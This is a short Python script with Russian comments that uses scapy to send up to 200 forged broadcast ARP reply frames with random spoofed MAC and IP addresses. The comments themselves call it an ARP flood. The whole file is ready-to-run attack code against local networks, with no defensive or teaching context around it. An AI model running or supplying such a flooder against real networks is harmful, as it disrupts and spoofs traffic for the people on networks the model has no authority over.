"""Чтобы решить проблемы в Windows со scapy, надо выполнить команду 
git clone https://github.com/secdev/scapy"""
import scapy
from scapy.all import *
import random
randomizer = random.randint(1,200)
my_interface = get_working_if() # вообще это не нужно, но ARP-flood особо не ограничен
myMAC = get_if_hwaddr(my_interface) # поэтому можно и свой MAC-адрес впихнуть, если хочется (делать этого не будем)
for i in range(randomizer):
	ehdr = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = str(RandMAC()), type=0x0806)
	ahdr = ARP(hwtype=1, ptype=0x0800, hwlen=6, plen=4, op=2, hwsrc=str(RandMAC()), psrc=str(RandIP()), hwdst=str(RandMAC()), pdst=str(RandIP()))
	padstr = '\x00' * (60 - len(ehdr) - len(ahdr))
	pad = Padding(load=padstr)
	frame = ehdr/ahdr/pad
	sendp(frame)
	print("ARP frame was sent from {} to {} with {} bytes".format(frame.src, frame.dst, len(frame)))
